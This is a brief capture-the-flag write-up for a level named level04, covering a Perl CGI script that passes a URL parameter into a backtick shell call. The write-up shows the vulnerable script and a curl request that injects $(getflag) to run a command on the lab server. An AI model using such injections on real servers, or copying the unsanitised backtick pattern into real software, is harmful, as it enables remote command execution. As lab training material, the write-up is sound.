FILE: level04.pl

```sh
$: cat level04.pl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

**we have a pearl script who execute echo with the first argument**
**since echo is betwen \`\` we can make it execute the getflag command**

**\$\(\) to send the result of getflag and \`\` so curl doesn't execute getflag but echo do**

```sh
$: curl '192.168.56.101:4747?x=$(getflag)'
******flag******
```
